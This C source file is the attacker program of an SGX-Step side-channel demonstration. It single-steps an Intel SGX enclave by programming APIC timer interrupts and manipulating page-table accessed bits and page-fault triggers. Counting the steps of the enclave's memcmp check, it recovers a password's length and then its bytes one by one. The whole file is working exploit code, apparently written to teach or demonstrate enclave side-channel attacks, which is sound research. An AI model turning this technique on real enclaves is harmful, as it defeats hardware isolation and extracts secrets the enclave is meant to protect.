#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/config.h"
#include "jsh-colors.h"
#include <sys/mman.h>

#define MAX_LEN            15
#define DO_STEP            1
#define DEBUG              0
#define DBG_ENCL           1
#define ANIMATION_DELAY    50000000

sgx_enclave_id_t eid = 0;
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
void *code_adrs, *trigger_adrs;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    #if DEBUG
        uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
        info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
    #endif
    irq_cnt++;

    if (do_irq && (irq_cnt > NUM_RUNS*1000))
    {
        info("excessive interrupt rate detected (try adjusting timer interval " \
             "to avoid getting stuck in zero-stepping); aborting...");
	    do_irq = 0;
    }

    if (ACCESSED(*pte_encl) && ACCESSED(*pte_trigger))
    {
        trigger_cnt++;
    }
    if (trigger_cnt >= 3)
    {
        do_irq = 0;
    }

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */
    if (ACCESSED(*pte_encl)) step_cnt++;
    *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
#if DO_STEP
    if (do_irq)
    {
        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
    }
#endif
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    ASSERT(fault_cnt++ < 10);

    switch ( signo )
    {
      case SIGSEGV:
        #if DEBUG
            info("Caught page fault (base address=%p)", si->si_addr);
        #endif
        break;

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    if (si->si_addr == trigger_adrs)
    {
        #if DEBUG
            info("Restoring trigger access rights..");
        #endif
        ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
        do_irq = 1;
    }
    else
    {
        info("Unknown #PF address!");
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

/* ================== ATTACKER INIT/SETUP ================= */

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    struct sigaction act, old_act;

    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    //print_system_settings();

    register_enclave_info();
    print_enclave_info();

    /* Specify #PF handler with signinfo arguments */
    memset(&act, sizeof(sigaction), 0);
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( SIGSEGV, &act, &old_act ));
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    SGX_ASSERT( get_memcmp_adrs( eid, &code_adrs) );
    SGX_ASSERT( get_trigger_adrs( eid, &trigger_adrs) );
    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);

    ASSERT( pte_encl    = remap_page_table_level( code_adrs, PTE) );
    ASSERT( PRESENT(*pte_encl) );
    *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
    info("enclave code at %p with PTE", code_adrs);
    print_pte_adrs( code_adrs );

    ASSERT( pte_trigger = remap_page_table_level( trigger_adrs, PTE) );
    ASSERT( PRESENT(*pte_trigger) );
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
    info("enclave trigger at %p with PTE", trigger_adrs);
    print_pte_adrs( trigger_adrs );

    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
    ASSERT( PRESENT(*pmd_encl) );
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_launch_token_t token = {0};
    int apic_fd, pwd_success = 0, updated = 0, i, pwd_len;
    char *pwd = malloc(MAX_LEN);
    idt_t idt = {0};
    int step_cnt_prev = 0;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/DBG_ENCL,
                                    &token, &updated, &eid, NULL ) );

    /* 0. dry run */
    SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

    /* 1. Setup attack execution environment. */
    attacker_config_runtime();
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

#if DO_STEP
    info_event("Establishing user-space APIC/IDT mappings");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);
#endif

    /* 2. Single-step enclaved execution. */
    info_event("recovering password length");
    for (pwd_len = 0; pwd_len < MAX_LEN; pwd_len++)
    {
        for (int j = 0; j < pwd_len; j++) pwd[j] = '*';
        pwd[pwd_len] = '\0';
        do_irq = 0; trigger_cnt = 0, step_cnt = 0, fault_cnt = 0;
        ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
        SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

        #if DEBUG
            printf("[attacker] steps=%d; guess='%s'\n", step_cnt, pwd);
        #else
            printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG, step_cnt, pwd);
            fflush(stdout);
            for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
        #endif

        if (pwd_len > 0 && step_cnt > step_cnt_prev) break;
        step_cnt_prev = step_cnt;
    }
    ASSERT( pwd_len < MAX_LEN );
    printf(COLOR_RESET_ALL "\n[attacker] found pwd len = %d\n", pwd_len);

#if 1
    info_event("recovering password bytes");
    
    for (i=0; i < pwd_len; i++)
    {
        step_cnt_prev = 100;
        for (int j='A'-1; j<'Z'; j++)
        {
            pwd[i] = j;
            do_irq = 0; trigger_cnt = 0, step_cnt = 0, fault_cnt = 0;
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
            SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

            #if DEBUG
                printf("[attacker] steps=%d; guess='%s --> %s'\n", step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL");
            #else
                printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG " --> %s",
                        step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL   ");
                fflush(stdout);
                for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
            #endif

            if (pwd_success || (j >= 'A' && step_cnt > step_cnt_prev)) break;
            step_cnt_prev = step_cnt;
        }
    }
    printf(COLOR_RESET_ALL "\n\n");
#endif

    info("all done; counted %d/%d IRQs (AEP/IDT)", irq_cnt, __ss_irq_count);
    return 0;
}
